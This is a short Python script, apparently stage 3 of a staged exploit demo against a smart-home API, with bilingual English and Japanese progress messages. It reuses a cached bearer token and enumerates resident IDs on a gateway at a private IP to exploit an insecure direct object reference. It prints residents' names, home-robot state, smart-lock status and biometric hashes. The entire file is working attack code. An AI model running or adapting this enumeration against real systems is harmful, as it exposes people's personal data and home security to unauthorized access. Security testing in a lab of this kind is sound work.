#!/usr/bin/env python3
import os
import sys
import json
import requests

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from progress_hud import eva_progress

TARGET_IP = "192.168.1.168"
GATEWAY_URL = f"http://{TARGET_IP}:30801"
TOKEN_CACHE = "/tmp/eva01_weaver_token.txt"

def run_stage_3():
    eva_progress(
        "🏠",
        "STAGE 3: IN-HOME ROBOTICS & SMART LIVING API (IDOR ENUMERATION)",
        "第3段階：家庭用ロボティクス・スマートリビングAPI（IDOR列挙）",
        "Enumerating Resident Smart-Home Endpoints via Object ID Manipulation",
        "オブジェクトID操作により住民スマートホーム端末を列挙中",
        duration=1.6
    )

    token = ""
    if os.path.exists(TOKEN_CACHE):
        with open(TOKEN_CACHE, "r") as f:
            token = f.read().strip()

    headers = {"Authorization": f"Bearer {token}"} if token else {}
    target_ids = ["resident-01", "resident-02", "resident-03"]

    for res_id in target_ids:
        url = f"{GATEWAY_URL}/api/v1/home/assist/{res_id}"
        resp = requests.get(url, headers=headers, timeout=5)
        if resp.status_code == 200:
            data = resp.json()
            telem = data.get("telemetry", {})
            print(f"🔓 [HTTP 200 - EXPOSED / 情報露出]: {res_id}")
            print(f"   👤 Resident / 住民名: {telem.get('name')}")
            print(f"   🤖 Home Bot / 家庭用ロボット: {telem.get('robot_state')}")
            print(f"   🚪 Smart Lock / スマートロック: {telem.get('door_lock')}")
            if "biometric_hash" in telem:
                print(f"   🧬 Biometric Hash / 生体認証ハッシュ: {telem.get('biometric_hash')}")
        else:
            print(f"🚫 [HTTP {resp.status_code}]: {res_id} not found / 該当なし")

    print("\n💥 [IDOR CONFIRMED / IDOR脆弱性確認]: Object-level authorization missing across resident profiles! / 住民プロファイル間のオブジェクトレベル認可が欠如しています！")

if __name__ == "__main__":
    run_stage_3()
